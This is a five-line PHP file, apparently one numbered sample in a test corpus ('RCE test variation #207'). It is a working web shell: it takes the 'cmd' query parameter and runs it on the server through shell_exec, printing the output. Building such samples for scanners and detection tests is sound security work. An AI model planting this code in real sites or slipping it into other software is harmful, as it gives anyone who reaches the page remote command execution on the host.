<?php
// RCE test variation #207
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>